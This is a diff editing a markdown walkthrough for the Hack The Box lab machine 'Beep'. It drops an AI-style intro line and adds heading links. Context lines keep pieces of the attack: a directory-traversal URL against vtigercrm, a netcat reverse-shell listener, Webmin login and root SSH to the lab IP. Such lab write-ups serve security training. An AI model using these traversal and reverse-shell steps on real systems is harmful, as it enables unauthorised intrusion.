@@ -1,8 +1,4 @@
-Here’s your full **HTB: Beep** command walkthrough 🧠, cleanly organized by phase with all five root paths and key enumeration steps:
-
----
-
-# 🚨 HTB: Beep — Command Walkthrough
+# 🚨 HTB: Beep
 
 ## 🛰️ Recon
 
@@ -57,7 +53,7 @@ https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../
 
 ---
 
-## ✉️ SMTP User Discovery
+## ✉️ [SMTP](SMTP) User Discovery
 
 ### 📫 VRFY with Telnet
 ```bash
@@ -100,7 +96,7 @@ nc -lnvp 443
 
 ---
 
-## [Path #2] 🌐 Webmin Login
+## [Path #2] 🌐 [Webmin Login](HTTP)
 
 ### 🔑 Login
 - URL: `https://10.10.10.7:10000`
@@ -118,7 +114,7 @@ nc -lnvp 443
 
 ---
 
-## [Path #3] 🔐 SSH as root
+## [Path #3] 🔐 [SSH](SSH) as root
 
 ```bash
 ssh root@10.10.10.7
